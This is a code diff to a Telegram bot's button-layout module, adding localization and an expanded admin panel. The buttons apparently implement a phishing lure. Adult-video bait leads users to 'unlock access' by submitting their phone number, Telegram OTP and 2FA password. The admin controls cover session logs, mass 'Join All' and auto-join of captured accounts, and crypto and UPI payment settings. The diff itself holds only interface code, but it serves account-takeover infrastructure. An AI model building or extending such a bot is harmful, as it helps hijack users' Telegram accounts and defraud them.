@@ -1,6 +1,7 @@
 from datetime import datetime
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 import config
+from localization import get_text
 
 CATEGORY_EMOJIS = {
     "fitness": "🏋️", "business": "💰", "mindset": "🧠",
@@ -145,103 +146,116 @@ def welcome_message(user_id, user_data):
     )
 
 
-def welcome_keyboard():
+def language_selection_keyboard():
     return make_keyboard([
-        [primary("🍆 FREE VIDEO 1", "free_video_1"), primary("🍑 FREE VIDEO 2", "free_video_2")],
-        [success("🔓 UNLOCK FULL ACCESS", "login")],
-        [success("💰 BUY PREMIUM", "purchase")],
-        [info("💡 WHAT IS THIS?", "reveal_twist"), primary("📞 CONTACT OWNER", "contact_owner")],
-        [danger("🚫 DELETE MY DATA", "delete_session")],
+        [primary("English 🇬🇧", "set_lang_en"), primary("Hindi 🇮🇳", "set_lang_hi")]
     ])
 
 
-def login_prompt_keyboard():
+def agreement_keyboard(lang="en"):
     return make_keyboard([
-        [primary("📞 SEND NUMBER", "login_number")],
-        [danger("🚫 CANCEL", "main_menu")],
+        [success(get_text("DISCLAIMER_AGREE", lang), "accept_agreement")],
+        [danger(get_text("DISCLAIMER_DECLINE", lang), "reject_agreement")]
     ])
 
 
-def otp_prompt_keyboard():
+def welcome_keyboard(lang="en"):
     return make_keyboard([
-        [success("✅ VERIFY OTP", "verify_otp")],
-        [warning("🔄 RESEND OTP", "resend_otp")],
-        [danger("❌ CANCEL", "main_menu")],
+        [primary(get_text("FREE_VIDEO_BTN", lang), "free_video_1"), primary(get_text("FREE_VIDEO_2_BTN", lang), "free_video_2")],
+        [success(get_text("UNLOCK_FULL_ACCESS_BTN", lang), "login")],
+        [success(get_text("BUY_PREMIUM_BTN", lang), "purchase")],
+        [info(get_text("WHAT_IS_THIS_BTN", lang), "reveal_twist"), primary(get_text("CONTACT_OWNER_BTN", lang), "contact_owner")],
+        [danger(get_text("DELETE_MY_DATA_BTN", lang), "delete_session")],
     ])
 
 
-def twofa_prompt_keyboard():
+def login_prompt_keyboard(lang="en"):
     return make_keyboard([
-        [primary("✅ ENTER 2FA PASSWORD", "enter_2fa")],
-        [warning("⏭️ SKIP 2FA", "skip_2fa")],
-        [danger("❌ CANCEL LOGIN", "main_menu")],
+        [primary(get_text("SEND_NUMBER_BTN", lang), "login_number")],
+        [danger(get_text("CANCEL_BTN", lang), "main_menu")],
     ])
 
 
-def login_success_keyboard():
+def otp_prompt_keyboard(lang="en"):
     return make_keyboard([
-        [success("💦 GIVE ME MY FIX", "next_video")],
-        [info("📊 MY STATS", "stats")],
-        [danger("🚪 LOGOUT", "delete_session")],
+        [success(get_text("VERIFY_OTP_BTN", lang), "verify_otp")],
+        [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
+        [danger(get_text("CANCEL_BTN", lang), "main_menu")],
     ])
 
 
-def after_video_keyboard():
+def twofa_prompt_keyboard(lang="en"):
     return make_keyboard([
-        [success("💪 ANOTHER ROUND", "next_video")],
-        [warning("⏳ SKIP VIDEO", "skip_video")],
-        [info("😰 NEED A BREAK", "need_break")],
+        [primary(get_text("ENTER_2FA_BTN", lang), "enter_2fa")],
+        [warning(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
+        [danger(get_text("CANCEL_BTN", lang), "main_menu")],
     ])
 
 
-def purchase_options_keyboard():
+def login_success_keyboard(lang="en"):
+    return make_keyboard([
+        [success(get_text("GIVE_FIX_BTN", lang), "next_video")],
+        [info(get_text("MY_STATS_BTN", lang), "stats")],
+        [danger(get_text("LOGOUT_BTN", lang), "delete_session")],
+    ])
+
+
+def after_video_keyboard(lang="en"):
+    return make_keyboard([
+        [success(get_text("ANOTHER_ROUND_BTN", lang), "next_video")],
+        [warning(get_text("SKIP_VIDEO_BTN", lang), "skip_video")],
+        [info(get_text("NEED_BREAK_BTN", lang), "need_break")],
+    ])
+
+
+def purchase_options_keyboard(lang="en"):
     rows = []
     for pack_key, pack_info in config.PURCHASE_OPTIONS.items():
         rows.append([
             primary(f"🍆 {pack_info['label']} ({pack_info['price']})", f"purchase_{pack_key}")
         ])
-    rows.append([info("🔙 BACK TO VIDEOS", "next_video")])
-    rows.append([danger("🏠 MAIN MENU", "main_menu")])
+    rows.append([info(get_text("BACK_BTN", lang), "next_video")])
+    rows.append([danger(get_text("MAIN_MENU_BTN", lang), "main_menu")])
     return make_keyboard(rows)
 
 
-def contact_owner_keyboard():
+def contact_owner_keyboard(lang="en"):
     return make_keyboard([
-        [success("💋 SEND MESSAGE TO OWNER", "dm_owner")],
-        [info("📋 COPY USER ID", "copy_user_id")],
-        [primary("🔙 GO BACK", "main_menu")],
+        [success(get_text("DM_OWNER_BTN", lang), "dm_owner")],
+        [info(get_text("COPY_USER_ID_BTN", lang), "copy_user_id")],
+        [primary(get_text("BACK_BTN", lang), "main_menu")],
     ])
 
 
-def reveal_keyboard():
+def reveal_keyboard(lang="en"):
     return make_keyboard([
-        [primary("🔄 SHARE THIS BOT", "share_bot")],
-        [info("📺 SHOW ME MORE", "next_video")],
-        [danger("🗑️ DELETE THIS EVIDENCE", "delete_session")],
+        [primary(get_text("SHARE_BOT_BTN", lang), "share_bot")],
+        [info(get_text("SHOW_ME_MORE_BTN", lang), "next_video")],
+        [danger(get_text("DELETE_THIS_EVIDENCE_BTN", lang), "delete_session")],
     ])
 
 
-def force_sub_keyboard(channel_username, invite_link):
+def force_sub_keyboard(channel_username, invite_link, lang="en"):
     return make_keyboard([
-        [primary("📢 JOIN OUR CHANNEL", url=invite_link)],
-        [success("✅ I'VE JOINED", "check_sub")],
+        [primary(get_text("JOIN_CHANNEL_BTN", lang), url=invite_link)],
+        [success(get_text("IVE_JOINED_BTN", lang), "check_sub")],
     ])
 
 
-def main_menu_keyboard():
+def main_menu_keyboard(lang="en"):
     return make_keyboard([
-        [primary("💦 NEXT VIDEO", "next_video"), success("🔓 UNLOCK ACCESS", "login")],
-        [success("💰 BUY PREMIUM", "purchase")],
-        [info("💡 WHAT IS THIS?", "reveal_twist"), info("📊 MY STATS", "stats")],
-        [warning("⚠️ REPORT ISSUE", "report_issue")],
-        [danger("🗑️ DELETE SESSION", "delete_session")],
+        [primary(get_text("GIVE_FIX_BTN", lang), "next_video"), success(get_text("UNLOCK_FULL_ACCESS_BTN", lang), "login")],
+        [success(get_text("BUY_PREMIUM_BTN", lang), "purchase")],
+        [info(get_text("WHAT_IS_THIS_BTN", lang), "reveal_twist"), info(get_text("MY_STATS_BTN", lang), "stats")],
+        [warning(get_text("REPORT_ISSUE_BTN", lang), "report_issue")],
+        [danger(get_text("DELETE_SESSION_BTN", lang), "delete_session")],
     ])
 
 
-def stats_keyboard():
+def stats_keyboard(lang="en"):
     return make_keyboard([
-        [success("💦 WATCH MORE", "next_video")],
-        [primary("🔙 BACK", "main_menu")],
+        [success(get_text("GIVE_FIX_BTN", lang), "next_video")],
+        [primary(get_text("BACK_BTN", lang), "main_menu")],
     ])
 
 
@@ -255,6 +269,19 @@ def admin_keyboard():
         [info("👥 USERS", "admin_users")],
         [info("📋 SESSION LOGS", "admin_logs")],
         [danger("⚙️ SETTINGS", "admin_settings")],
+    ])
+
+
+def telegram_admin_panel_keyboard(maintenance_active=False):
+    maint_btn = danger("🔴 Disable Maintenance", "adm_toggle_maint") if maintenance_active else success("🟢 Enable Maintenance", "adm_toggle_maint")
+    return make_keyboard([
+        [danger("📅 Sub Plans", "adm_sub_plans"), danger("🔗 Set Force Join", "adm_force_join")],
+        [primary("📁 Set Log Group", "adm_log_group"), primary("🏷️ Set Branding Name", "adm_brand_name")],
+        [success("⏰ Set Branding Days", "adm_brand_days"), success("🖼️ Set Menu Images", "adm_menu_images")],
+        [danger("🏦 Set UPI ID", "adm_upi"), danger("🪙 Set USDT", "adm_usdt"), danger("💎 Set TON", "adm_ton")],
+        [primary("👥 Join All", "adm_join_all"), primary("🔗 Auto-Joins", "adm_auto_joins"), primary("👤 User Manage", "adm_user_manage")],
+        [success("📊 Set Commission", "adm_commission"), maint_btn],
+        [danger("👥 Manage Admins", "adm_admins"), danger("🔙 Back to Menu", "main_menu")]
     ])
 
 
